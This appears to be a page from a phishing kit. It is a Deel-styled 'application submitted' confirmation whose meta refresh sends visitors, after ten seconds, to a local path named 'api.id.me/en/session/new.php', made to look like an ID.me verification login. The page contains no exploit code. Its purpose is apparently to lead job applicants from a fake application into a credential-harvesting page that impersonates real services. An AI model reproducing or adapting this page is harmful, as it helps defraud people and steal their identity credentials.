<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta HTTP-EQUIV="Refresh" CONTENT="10; URL=api.id.me/en/session/new.php">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Thank You</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #979797;
      font-family: 'Inter', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .thankyou-card {
      background: white;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 520px;
      overflow: hidden;
    }

    .header {
      padding: 20px 30px;
      display: flex;
      align-items: center;
      background: #f7f7f7;
    }

    .header img {
      max-height: 70px;
      max-width: 200px;
      object-fit: contain;
    }

    .divider {
      height: 1px;
      background: #ddd;
      margin: 0 30px;
    }

    .content {
      padding: 40px 30px;
      text-align: center;
    }

    .tick-icon {
      width: 100px;
      height: 100px;
      margin-bottom: 20px;
    }

    h2 {
      color: #019301;
      font-weight: 600;
      font-size: 20px;
      margin-bottom: 20px;
    }

    .spinner {
      margin: 30px auto 10px;
      border: 4px solid rgba(253, 137, 21, 0.25);
      border-top: 4px solid rgba(253, 137, 21, 0.9);
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 0.6s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .redirect-text {
      font-size: 16px;
      color: #444;
      margin-top: 10px;
      animation: fade-in 0.5s ease-in-out 5s forwards;
      opacity: 0;
    }

    .logo-img {
      max-height: 80px;     /* You can tweak this */
      max-width: 220px;     /* And this */
      width: 80px;
      height: 200px;
      object-fit: contain;
    }


    @keyframes fade-in {
      to {
        opacity: 1;
      }
    }
  </style>
</head>
<body>

  <div class="thankyou-card">

    <!-- ✅ Header with Logo -->
    <div class="header">
      <img src="cropped-favicon-192x192.686a7a4398e503.57414854e52d.png" alt="Your Logo" class="logo-img">
    </div>

    <!-- ✅ Divider -->
    <div class="divider"></div>

    <!-- ✅ Main Content -->
    <div class="content">
      <img src="deel-greentick.png" alt="Green Tick" class="tick-icon">
      <h2>Thank you, your application has been submitted successfully!</h2>
      <div class="spinner"></div>
      <p class="redirect-text">Please wait... you are being redirected for your verification.</p>
    </div>

  </div>

</body>
</html>
